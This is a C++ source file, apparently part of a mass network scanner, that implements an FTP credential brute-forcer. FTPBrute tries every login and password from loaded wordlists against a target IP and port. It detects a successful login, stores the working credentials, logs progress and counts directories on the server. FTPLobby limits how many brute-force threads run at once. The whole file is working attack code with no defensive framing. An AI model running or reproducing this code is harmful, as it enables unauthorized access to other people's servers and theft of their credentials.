#include "FTPAuth.h"

bool FTPA::checkOutput(const string *buffer) {
    if(Utils::ci_find_substr(*buffer, "230") != -1) {

        return true;
    }

    return false;
}

lopaStr FTPA::FTPBrute(const char *ip, const int port, PathStr *ps) {
    string buffer;
    string lpString;
    lopaStr lps;
    ZeroMemory(lps.login, sizeof(lps.login));
    ZeroMemory(lps.pass, sizeof(lps.pass));
    ZeroMemory(lps.other, sizeof(lps.other));

    strcpy(lps.login, "UNKNOWN");
	int res = 0;
	int passCounter = 0;

    char login[128] = {0};
    char pass[32] = {0};

    for(int i = 0; i < MaxLogin; ++i)
    {
        if(!globalScanFlag) return lps;
        if(strlen(loginLst[i]) <= 1) continue;

        strcpy(login, loginLst[i]);

        for(int j = 0; j < MaxPass; ++j)
        {
            if(!globalScanFlag) return lps;
            if(strlen(passLst[j]) <= 1) continue;

            strcpy(pass, passLst[j]);

            lpString = string(login) + ":" + string(pass);
			
			res = Connector::nConnect((string("ftp://") + string(ip)).c_str(), port, &buffer, NULL, NULL, &lpString);
			if (res == -2) return lps;
			else if (res != -1) {
				if (!globalScanFlag) return lps;
                strcpy(lps.login, login);
                strcpy(lps.pass, pass);
				ps->directoryCount = std::count(buffer.begin(), buffer.end(), '\n');
				return lps;
			};

			if (BALogSwitched) stt->doEmitionBAData("FTP: " + QString(ip) + ":" + QString::number(port) +
                "; l/p: " + QString(login) + ":" + QString(pass) + ";	- Progress: (" +
				QString::number((++passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");

            Sleep(100);
        }
    }

    return lps;
}

lopaStr FTPA::FTPLobby(const char *ip, const int port, PathStr *ps) {
    while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

    BruteUtils::BConInc();
    const lopaStr &lps = FTPBrute(ip, port, ps);
    BruteUtils::BConDec();

    return lps;
}
